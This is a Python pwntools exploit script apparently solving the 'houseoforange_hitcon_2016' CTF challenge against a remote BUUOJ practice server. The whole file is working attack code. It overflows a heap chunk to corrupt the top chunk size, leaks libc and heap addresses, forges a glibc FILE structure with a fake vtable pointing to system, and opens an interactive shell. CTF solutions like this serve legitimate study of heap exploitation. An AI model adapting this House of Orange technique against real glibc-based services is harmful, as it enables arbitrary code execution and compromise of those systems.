from pwn import *
from LibcSearcher import *

r = remote("node4.buuoj.cn", 25681)
#r = process("./houseoforange_hitcon_2016")

context.log_level = 'debug'
DEBUG = 0
if DEBUG:
	gdb.attach(r, 
	'''
	b *$rebase(0x13CB)
	c
	x/10gx $rebase(0x203068)
	''')
elf = ELF("./houseoforange_hitcon_2016")
libc = ELF('./libc/libc-2.23.so')

def add(size, content, price, color):
	r.recvuntil("Your choice : ")
	r.sendline('1')
	r.recvuntil("Length of name :")
	r.sendline(str(size))
	r.recvuntil("Name :")
	r.send(content)
	r.recvuntil("Price of Orange:")
	r.sendline(str(price))
	r.recvuntil("Color of Orange:")	#1-7
	r.sendline(str(color))


def show():
	r.recvuntil("Your choice : ")
	r.sendline('2')

def edit(size, content, price, color):
	r.recvuntil("Your choice : ")
	r.sendline('3')
	r.recvuntil("Length of name :")
	r.sendline(str(size))
	r.recvuntil("Name:")
	r.send(content)
	r.recvuntil("Price of Orange:")
	r.sendline(str(price))
	r.recvuntil("Color of Orange:")	#1-7
	r.sendline(str(color))



add(0x30,'aaaa\n',0x1234,0xddaa)
payload = 'a' * 0x30 +p64(0) + p64(0x21) + p32(666) + p32(0xddaa) + p64(0) * 2 + p64(0xf81)
edit(len(payload), payload, 666, 0xddaa)

add(0x1000, 'a\n',0x1234, 0xddaa)
add(0x400, 'a' * 8, 199, 2)
show()
r.recvuntil('a'*8)
malloc_hook = u64(r.recvuntil('\x7f').ljust(8, '\x00')) - 0x668 - 0x10
success('malloc_hook = '+hex(malloc_hook))
libc.address = malloc_hook - libc.symbols['__malloc_hook']
io_list_all = libc.symbols['_IO_list_all']
system = libc.symbols['system']

payload = 'b' * 0x10
edit(0x10, payload, 199, 2)
show()
r.recvuntil('b'*0x10)
heap = u64(r.recvuntil('\n').strip().ljust(8, '\x00'))
heap_base = heap - 0xE0
success('heap = '+hex(heap))

#pause()
payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(666) + p32(0xddaa) + p64(0)
fake_file = '/bin/sh\x00'+p64(0x61)#to small bin
fake_file += p64(0)+p64(io_list_all-0x10)
fake_file += p64(0) + p64(1)#_IO_write_base < _IO_write_ptr
fake_file = fake_file.ljust(0xc0,'\x00')
fake_file += p64(0) * 3
fake_file += p64(heap_base+0x5E8) #vtable ptr
fake_file += p64(0) * 2
fake_file += p64(system)
payload += fake_file
edit(len(payload), payload, 666, 2)
#pause()
r.recvuntil("Your choice : ")
r.sendline('1')

r.interactive()
